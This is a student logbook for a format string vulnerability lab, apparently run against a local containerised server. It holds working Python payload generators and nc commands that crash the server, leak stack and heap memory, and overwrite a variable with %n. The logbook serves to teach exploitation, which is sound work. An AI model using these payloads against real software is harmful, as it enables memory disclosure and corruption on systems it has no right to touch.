# Logbook #6

> Environment Setup:
> ```bash
> $ sudo sysctl -w kernel.randomize_va_space=0
> $ make && make install    # Inside "server-code" directory
> $ cd .. && dcbuild && dcup
> ```

## Task 1: Crashing the Program

Sine we have control over the format string, to crash the format program it is enough to provide "%s" as input. This is because the program will try to read a string from the stack, but none was provided as an argument to the `printf` function.
```bash
$ echo "%s" | nc 10.9.0.5 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd430
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 3 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd358
server-10.9.0.5 | The target variable's value (before): 0x11223344
# No return message, i.e, format crashed
```

## Task 2: Printing Out the Server Program’s Memory

### Step 1: Stack Data

It is necessary 64 %x to reach to the first 4 bytes of the input buffer.

- Auxiliary script to generate the payload:
```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

s = "++++" + "%8x\n"*64

fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd4c0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd3e8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | ++++11223344
server-10.9.0.5 |     1000
server-10.9.0.5 |  8049db5
server-10.9.0.5 |  80e5320
server-10.9.0.5 |  80e61c0
server-10.9.0.5 | ffffd4c0
server-10.9.0.5 | ffffd3e8
server-10.9.0.5 |  80e62d4
server-10.9.0.5 |  80e5000
server-10.9.0.5 | ffffd488
server-10.9.0.5 |  8049f7e
server-10.9.0.5 | ffffd4c0
server-10.9.0.5 |        0
server-10.9.0.5 |       64
server-10.9.0.5 |  8049f47
server-10.9.0.5 |  80e5320
server-10.9.0.5 |      5dc
server-10.9.0.5 |      5dc
server-10.9.0.5 | ffffd4c0
server-10.9.0.5 | ffffd4c0
server-10.9.0.5 |  80e9720
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 | e1a62200
server-10.9.0.5 |  80e5000
server-10.9.0.5 |  80e5000
server-10.9.0.5 | ffffdaa8
server-10.9.0.5 |  8049eff
server-10.9.0.5 | ffffd4c0
server-10.9.0.5 |      5dc
server-10.9.0.5 |      5dc
server-10.9.0.5 |  80e5320
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 | ffffdb74
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |        0
server-10.9.0.5 |      5dc
server-10.9.0.5 | 2b2b2b2b  # ASCII code for "++++"
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Step 2: Heap Data

Given that it takes 63 "%x" to reach the start of the input buffer, we only need to provide the address of the secret message as the first 4 bytes of the input buffer and print its contents using "%s" in the format string.

- Auxiliary script to generate the payload:
```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080b4008
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%8x\n"*63 + "%s"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd4c0
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd3e8
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 |@
                 11223344
server-10.9.0.5 |     1000
[...]
server-10.9.0.5 |      5dc
server-10.9.0.5 | A secret message
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Task 3: Modifying the Server Program’s Memory

### Step 1: Change the value to a different value

The "%n" format specifier writes the number of characters written so far to the address of the variable provided as an argument, which is the first 4 bytes of the input buffer with this payload, i.e., the address of the target variable.

- Auxiliary script to generate the payload:
```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%8x\n"*63 + "%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd220
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd148
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h11223344
server-10.9.0.5 |     1000
[...]
server-10.9.0.5 |        0
server-10.9.0.5 |      5dc
server-10.9.0.5 | The target variable's value (after):  0x0000023b
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

### Step 2: Change the value to 0x5000

To change the value to 0x5000 (20480 in decimal), we need to create a payload that respects two conditions:
- The number of characters printed until "%n" must be 20480, so that the target variable is set to 0x5000.
- The number of "%x" in the payload must be 63, so that the pointer used by "%n" is the address of the target variable, i.e., the first 4 bytes of the input buffer.
The following python script generates that payload:

```py
#!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

number  = 0x080e5068
content[0:4]  =  (number).to_bytes(4,byteorder='little')

s = "%8x\n"*62 + "%19917x\n" + "%n"

fmt  = (s).encode('latin-1')
content[4:4+len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ cat badfile | nc 10.9.0.5 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0xffffd220
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd148
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | h11223344
server-10.9.0.5 |     1000
[...]                                                                                                                  5dc
server-10.9.0.5 | The target variable's value (after):  0x00005000
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

## Question 2

When the input buffer is located in the heap, it is impossible to provide something that is in the input buffer as an argument to the printf function, since the input buffer is not in the stack. Therefore, we can not read or write to an arbitrary memory address and we are dependent on what is in the stack.

However, this server has a pointer to the start of the input buffer in the stack, which allows to print the input buffer contents.

- 1. Modify the `format.c` to allocate the format string in the heap:
```c
char *buf = calloc(1500, sizeof(char)); // At line 57
```

- 2. Start the server and run the following payload:
```py
!/usr/bin/python3
import sys

N = 1500
content = bytearray(0x0 for i in range(N))

s = "++++" + "%8x\n"*5 + "%s\n"

fmt  = (s).encode('latin-1')
content[0:len(fmt)] = fmt

with open('badfile', 'wb') as f:
  f.write(content)
```

```bash
$ cat badfile | nc 10.9.0.1 9090
server-10.9.0.5 | Got a connection from 10.9.0.1
server-10.9.0.5 | Starting format
server-10.9.0.5 | The input buffer's address:    0x080e9310
server-10.9.0.5 | The secret message's address:  0x080b4008
server-10.9.0.5 | The target variable's address: 0x080e5068
server-10.9.0.5 | Waiting for user input ......
server-10.9.0.5 | Received 1500 bytes.
server-10.9.0.5 | Frame Pointer (inside myprintf):      0xffffd808
server-10.9.0.5 | The target variable's value (before): 0x11223344
server-10.9.0.5 | ++++11223344
server-10.9.0.5 |     1000
server-10.9.0.5 |  8049db5
server-10.9.0.5 |  80e5320
server-10.9.0.5 |  80e61c0
server-10.9.0.5 | ++++%8x   # The contents of the input buffer start here
server-10.9.0.5 | %8x
server-10.9.0.5 | %8x
server-10.9.0.5 | %8x
server-10.9.0.5 | %8x
server-10.9.0.5 | %s
server-10.9.0.5 | The target variable's value (after):  0x11223344
server-10.9.0.5 | (^_^)(^_^)  Returned properly (^_^)(^_^)
```

In any case, modifications to the stack are not possible, because it is impossible to manually navigate to the address of the buffer.